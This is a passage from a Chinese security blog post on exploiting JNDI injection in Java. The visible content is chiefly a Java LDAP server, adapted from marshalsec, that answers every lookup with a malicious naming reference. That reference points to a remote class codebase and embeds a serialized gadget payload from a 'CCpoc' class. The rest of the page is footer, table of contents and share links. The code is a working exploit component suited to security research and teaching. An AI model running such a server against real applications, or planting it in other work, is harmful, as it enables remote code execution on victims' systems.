class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * LDAP server implementation returning JNDI references</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapDataServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(<span class="string">&quot;http://127.0.0.1:8888/#Calc&quot;</span>)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,<span class="keyword">new</span> CCpoc().generate_payload());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210316142401711.png"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lt-8u191"><span class="toc-number">2.</span> <span class="toc-text">&lt; 8u191</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%89%A5-8u191"><span class="toc-number">3.</span> <span class="toc-text">≥ 8u191</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0-Class-%E4%BD%9C%E4%B8%BA-Reference-Factory"><span class="toc-number">3.1.</span> <span class="toc-text">利用本地 Class 作为 Reference Factory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8LDAP%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE"><span class="toc-number">3.2.</span> <span class="toc-text">利用LDAP返回序列化数据</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&text=Exploitng JNDI Injection In Java"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&title=Exploitng JNDI Injection In Java"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&is_video=false&description=Exploitng JNDI Injection In Java"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Exploitng JNDI Injection In Java&body=Check out this article: http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&title=Exploitng JNDI Injection In Java"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&title=Exploitng JNDI Injection In Java"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&title=Exploitng JNDI Injection In Java"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&title=Exploitng JNDI Injection In Java"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&name=Exploitng JNDI Injection In Java&description=&lt;p&gt;最近梳理了一下 JNDI Injection 的攻击面&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&t=Exploitng JNDI Injection In Java"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2021 M13n
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
